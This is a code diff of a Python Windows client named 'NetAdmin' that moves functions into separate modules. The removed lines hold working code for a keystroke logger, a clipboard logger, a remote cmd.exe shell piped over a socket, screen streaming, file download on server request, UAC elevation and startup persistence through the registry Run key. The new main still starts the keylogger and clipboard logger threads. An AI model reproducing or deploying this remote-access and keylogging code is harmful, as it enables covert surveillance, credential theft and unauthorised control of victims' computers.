@@ -1,21 +1,18 @@
 import argparse
 import configparser
-import shutil
+import pathlib
+import helpers
 import time
 import traceback
-import cv2
-import keyboard
-import mss
-import numpy
+import FileExplorer
 import platform
-import pyperclip
+import OpenConnectionHandlers
 import pyautogui
 import pythoncom
 import win32com.client as com
 import wmi
 import psutil
 import GPUtil
-import winreg
 import win32api
 from os import listdir
 from os.path import isfile, join
@@ -26,8 +23,10 @@ import statics
 from OpenConnectionHelpers import *
 from turbojpeg import TurboJPEG
 import mss.windows
-from subprocess import Popen, PIPE
 from SmartSocket import SmartSocket
+import Keylog
+import installer
+from tendo import singleton
 
 try:
     logger = logging_setup.setup_logger()
@@ -37,219 +36,6 @@ try:
 
     logger.info(f"TurboJPEG path: {statics.TURBOJPEG_PATH}")
     jpeg = TurboJPEG(statics.TURBOJPEG_PATH)
-
-    # create a decorator to try the function and catch any exceptions
-    def try_connection(func):
-        def wrapper(*args, **kwargs):
-            try:
-                return func(*args, **kwargs)
-            except (ConnectionAbortedError, ConnectionResetError, OSError) as e:
-                print(f"THREAD {threading.current_thread().name} [FUNC {func.__name__}]: Connection disconnected by server without message:")
-                print(e)
-        return wrapper
-
-    @try_connection
-    def receive(sock, proc):
-        while True:
-            data = sock.recv(1024)
-            print(f"Got data: {data.decode()}")
-            proc.stdin.write(data)
-            proc.stdin.flush()
-            proc.stdin.write("\n".encode())
-            proc.stdin.flush()
-
-    #@profile
-    def screenShareClient(conn : SmartSocket, response_id):
-        with mss.mss() as sct:
-            monitor = sct.monitors[0]
-            # send response to client
-            # user32 = ctypes.windll.user32
-            # local_resolution = str((user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)))
-            local_resolution = (monitor['width'], monitor['height'])
-            conn.send_message(
-                NetMessage(type=NetTypes.NetStatus, data=NetStatusTypes.NetOK, extra=str(local_resolution), id=response_id))
-
-            # The region to capture
-            i = 0
-            start = time.time()
-            while True:
-                if i == 30:
-                    print(f'ScreenShare FPS: {(30 / (time.time() - start))}')
-                    i = 0
-                    start = time.time()
-                i += 1
-                image = numpy.array(sct.grab(monitor))
-                image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)
-                image = jpeg.encode(image, quality=75)
-                # buffer = io.BytesIO()
-                # im = Image.frombytes('RGB', image.size, image.rgb)
-                # im.save(buffer, format="JPEG", quality=75)
-                # Send the size of the pixels length
-
-                # # Send pixels
-                # buffer.seek(0)
-                # g = buffer.read()
-                # conn.send(len(image).to_bytes(4, "big"))
-                # conn.send(image)
-                try:
-                    conn.send_appended_stream(image)
-                except:
-                    print("ScreenShare connection closed")
-                    return
-
-
-    @try_connection
-    def handleOpenConnection(client : SmartSocket):
-        print("OpenConnection from: " + str(client.getsockname()))
-
-        # listener loop
-        while True:
-            # read message
-            size, message, isEncrypted = client.receive_message()
-            if isEncrypted:
-                print("Decrypted message")
-
-            if size == -1:
-                # if server disconnected, close local open connection server
-                client.close()
-                break
-
-            id = message['id'] # get the echo id of the message, to echo back to the server when sending response
-
-            # if message is a request
-            if message['type'] == NetTypes.NetRequest.value:
-                # if the request is to close the connection
-                if message['data'] == NetTypes.NetCloseConnection.value:
-                    print(f"Closing unmanaged connection {str(client.getsockname())}")
-                    client.close()
-                    break
-
-                elif message['data'] == NetTypes.NetRemoteControl.value:
-                    print(f"Remote control request from {str(client.getsockname())}")
-                    # open screenshare
-                    p = threading.Thread(target=screenShareClient, args=(client, id))
-                    p.start()
-                    break
-
-                # if the request is to open a shell connection
-                elif message['data'] == NetTypes.NetOpenShell.value:
-                    # open shell process
-                    import subprocess
-                    p = subprocess.Popen("cmd.exe", stdout=subprocess.PIPE, stdin=subprocess.PIPE,
-                                         stderr=subprocess.STDOUT, shell=True)
-                    thread = threading.Thread(target=receive, args=(client, p,))
-                    thread.start()
-                    client.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
-                    while p.poll() is None:
-                        n = p.stdout.readline()
-                        client.send_appended_stream(n)
-
-                # if the request is to download file
-                elif message['data'] == NetTypes.NetDownloadFile.value:
-                    # get the file directory
-                    directory = message['extra']
-
-                    # send all files
-                    sendallfiles(client, directory)
-
-                    # send file download end status
-                    client.send_message(NetMessage(NetTypes.NetStatus.value, NetStatus(NetStatusTypes.NetDownloadFinished.value)))
-
-    def ActualDirectorySize(path, f):
-        size = 0
-        try:
-            for dir in os.scandir(path):
-                try:
-                    if dir.is_file():
-                        size += dir.stat().st_size
-                    else:
-                        size += ActualDirectorySize(dir.path, False)
-                except:
-                    print("Error getting size of " + dir.path)
-        except:
-            print("Error getting size of " + path)
-            if f:
-                return 0 # signifying that the size of all accessible files (which is no files) is 0
-        return size
-
-    key_queue_lock = threading.Lock()
-    key_queue = list()
-
-    class KeyPressContainer:
-        def __init__(self, key):
-            if key == "space":
-                self.key = " "
-            elif len(key) > 1:
-                self.key = str.upper(key)
-            else:
-                self.key = key
-            self.total = 1
-
-        def inc(self):
-            self.total += 1
-
-        def __eq__(self, other):
-            return self.key == other.key
-
-        def __str__(self):
-            if len(self.key) > 1:
-                if self.total > 1:
-                    return f" [{self.key} x{self.total}] "
-                else:
-                    return f" [{self.key}] "
-            else:
-                return self.key*self.total
-
-    def keyhook(event):
-        # make a keypress container out of the event
-        keyContainer = KeyPressContainer(event.name)
-        if event.event_type == 'down':
-            # if the key is already in the top of the queue, increment the total
-            with key_queue_lock:
-                # if queue has keys in it
-                if len(key_queue) > 0:
-                    if key_queue[-1] == keyContainer:
-                        key_queue[-1].inc()
-                    else:
-                        key_queue.append(keyContainer)
-
-                else:
-                    # try:
-                    #     iEvent = ord(event.name)
-                    # except:
-                    #     iEvent = None
-                    # if iEvent:
-                    #     if 126 >= iEvent >= 33:
-                    #         strPrev = str(event.name)
-                    #         key_queue.put(strPrev)
-                    # else:
-                    key_queue.append(keyContainer)
-
-    import pathlib
-
-    def keylogger(status):
-        keyboard.hook(keyhook)
-        while status:
-            with key_queue_lock:
-                if len(key_queue):
-                    with open(statics.KEYLOGGER_FILE_PATH, "a+") as f:
-                        logger.debug("OPENED KEYLOGGER FUNC")
-                        f.write(f"[{datetime.datetime.now()}] ")
-                        while len(key_queue) > 0:
-                            f.write(str(key_queue.pop(0)))
-                        f.write("\n")
-            time.sleep(2)
-
-    def clipboard_logger(status):
-        prevClip = None
-        while status:
-            cClip = pyperclip.paste()
-            if prevClip != cClip:
-                prevClip = cClip
-                with open(statics.CLIPBOARD_FILE_PATH, "a+") as f:
-                    logger.debug("OPENED CLIPBOARD FUNC")
-                    f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
-            time.sleep(2)
 
     process_status = SharedBoolean(True)
 
@@ -277,23 +63,21 @@ try:
             cType = "ip"
 
         pythoncom.CoInitialize()
-        logger.info("SERVICE STARTED")
         pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)
 
-        thread = threading.Thread(target=keylogger, args=(process_status,))
+        thread = threading.Thread(target=Keylog.keylogger, args=(process_status,))
         thread.start()
 
         # create clipboard logger
-        thread2 = threading.Thread(target=clipboard_logger, args=(process_status,))
+        thread2 = threading.Thread(target=Keylog.clipboard_logger, args=(process_status,))
         thread2.start()
-        print("Started keylogger and clipboard logger")
 
         computer = wmi.WMI()
 
         while True:
             try:
                 if cType.lower() == "hostname":
-                    sockaddr = socket.getaddrinfo(cAddress, cPort)[0][4]
+                    sockaddr = socket.getaddrinfo(cAddress, int(cPort))[0][4]
                 else:
                     sockaddr = (cAddress, int(cPort))
 
@@ -315,7 +99,7 @@ try:
                     logger.info("PROCESS STATUS IS FALSE, STOPPING THE PROCESS")
                     break
 
-    @try_connection
+    @helpers.try_connection
     def client_connection_main(s, computer):
         # main loop
         # receives and unpacks messages from the server, and checks the type of message
@@ -328,7 +112,6 @@ try:
 
             # if message is an error
             if message['type'] == NetTypes.NetStatus.value:
-
                 # identification error
                 if message['data'] == NetStatusTypes.NetInvalidIdentification.value:
                     print("Invalid identification sent. Resetting...")
@@ -343,7 +126,7 @@ try:
                 if message['data'] == NetTypes.NetHeartbeat.value:
                     s.send_message(NetMessage(type=NetTypes.NetHeartbeat, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
                 elif message['data'] == NetTypes.NetUninstallClient.value:
-                    quit(0)
+                    installer.uninstall()
                 elif message['data'] == NetTypes.NetKeyboardAction.value:
                     print(f"Keyboard action request from {message['extra']}")
                     pyautogui.press(message['extra'], _pause=False)
@@ -407,7 +190,7 @@ try:
 
                     # send the size of the directory
                     start = datetime.datetime.now()
-                    actualCall = ActualDirectorySize(directory, True)
+                    actualCall = FileExplorer.ActualDirectorySize(directory, True)
                     print(f"Manual method for {directory}: {datetime.datetime.now() - start}")
                     s.send_message(NetMessage(type=NetTypes.NetDirectorySize, data=NetDirectorySize(actualCall), id=id))
 
@@ -491,7 +274,7 @@ try:
                     sock.send_appended_stream(s.fernetInstance.encrypt(orjson.dumps(NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetOK.value), id=id))))
                     if Fkey:
                         sock.set_key(Fkey)
-                    thread = threading.Thread(target=handleOpenConnection, args=(sock,))
+                    thread = threading.Thread(target=OpenConnectionHandlers.handleOpenConnection, args=(sock,))
                     thread.start()
 
                 # # if request actual folder size
@@ -583,93 +366,8 @@ try:
                 reg_helpers.set_id(message['data']['id'])
                 reg_helpers.set_encryption_key(message['extra'])
 
-
-    import ctypes, sys
-
-    def is_admin():
-        try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
-            return False
-
-
-    def install(run=True):
-        try:
-            '''
-            1. Copies the exeutable to ProgramData
-            2. Adds to startup.
-            Args:
-                run: whether to run the client after installation
-    
-            '''
-            print("Installing NetAdmin.... Please wait....")
-
-            if not is_admin():
-                logger.info("NOT ADMIN")
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
-                sys.exit(0)
-            else:
-                logger.info("IS ADMIN!!!")
-
-            # check if exe exists
-            pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)
-            # if not os.path.isfile(BASE_PATH+"NetAdmin.exe"):
-            #     # copy our file to the path
-            #     logger.info("NetAdmin.exe not found in ProgramData. Copying NetAdmin.exe to ProgramData...")
-            logger.info("Copying NetAdmin.exe to ProgramData...")
-            try:
-                shutil.copy(sys.executable, statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")
-            except:pass
-
-            # verify that config file exists
-            config = runconfig.get_runconfig(statics.PROGRAMDATA_NETADMIN_PATH)
-            if not config:
-                input_installation(statics.PROGRAMDATA_NETADMIN_PATH)
-
-            # proc_arch = os.environ.get('PROCESSOR_ARCHITECTURE')
-            # proc_arch64 = os.environ.get('PROCESSOR_ARCHITEW6432')
-
-            # if proc_arch.lower() == 'x86' and not proc_arch64:
-            #     arch_keys = {0}
-            # elif proc_arch.lower() == 'x86' or proc_arch.lower() == 'amd64':
-            #     arch_keys = winreg.KEY_WOW64_32KEY
-
-            # check if registry value has been set
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
-                                 winreg.KEY_SET_VALUE)
-            try:
-                winreg.QueryValue(key, "NetAdmin")
-            except Exception as e:
-                print(e)
-                # create registry value
-                winreg.SetValueEx(key, "NetAdmin", 0, winreg.REG_SZ, statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe --run_main")
-                logger.info("NetAdmin.exe added to startup")
-            else:
-                logger.info("NetAdmin.exe already added to startup")
-            winreg.CloseKey(key)
-            ctypes.windll.user32.MessageBoxW(0, "The installation process has finished.", "Installation Complete", 0)
-            CREATE_NEW_PROCESS_GROUP = 0x00000200
-            DETACHED_PROCESS = 0x00000008
-
-            Popen([statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe", "-r"], stdin=PIPE, stdout=PIPE, stderr=PIPE, creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
-
-            sys.exit(0)
-        except Exception as e:
-            logger.info(traceback.format_exc())
-
-    def get_exe_directory():
-        return os.path.dirname(sys.executable)+"\\"
-
-    def input_installation(path):
-        print("Welcome to the NetAdmin manual installation. This window is shown because the manual installation option was chosen in the client executable creation process.")
-        ip = input("IP: ")
-        port = input("Port: ")
-        config = configparser.ConfigParser()
-        config['CONNECTION'] = {'ip_or_hostname': ip, 'port': port, 'type': 'ip'}
-        with open(path + "runconfig.ini", 'w+') as configfile:
-            config.write(configfile)
-
     if __name__ == "__main__":
+        singleton.SingleInstance()
         logger.info(statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")
         if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
             main()
@@ -681,14 +379,14 @@ try:
             logger.info("args=%s" % str(sys.argv))
             args = parser.parse_args()
             if args.run_main:
-                logger.info("EXE Directory: "+get_exe_directory())
-                config = runconfig.get_runconfig(get_exe_directory())
+                logger.info("EXE Directory: "+helpers.get_exe_directory())
+                config = runconfig.get_runconfig(helpers.get_exe_directory())
                 if not config:
                     logger.info("ERROR: NO CONFIG FILE WAS FOUND. INSTALLATION CORRUPTED. ")
                 else:
                     main(config)
             else:
-                install()
+                installer.install()
 
 except Exception as e:
     if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
